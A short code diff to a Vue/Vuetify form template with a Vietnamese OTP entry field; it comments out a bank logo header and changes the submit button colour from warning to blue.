@@ -1,12 +1,12 @@
 <template>
     <div class="">
-        <div>
+        <!-- <div>
             <div style="display: flex; justify-content: center">
                 <a href="">
                     <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                 </a>
             </div>
-        </div>
+        </div> -->
         <div style="margin-top: 20px">
             <v-form ref="formRef" @submit.prevent="submit">
                 <v-row justify="center">
@@ -129,7 +129,7 @@
                     <v-text-field v-model="otpCt" variant="filled" label="Nhập mã OTP" :rules="rules.otpCt"></v-text-field>
                 </v-card-text>
                 <v-card-actions>
-                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
+                    <v-btn color="blue" block class="pa-4" type="submit">Tiếp tục</v-btn>
                 </v-card-actions>
             </v-form>
         </v-card>
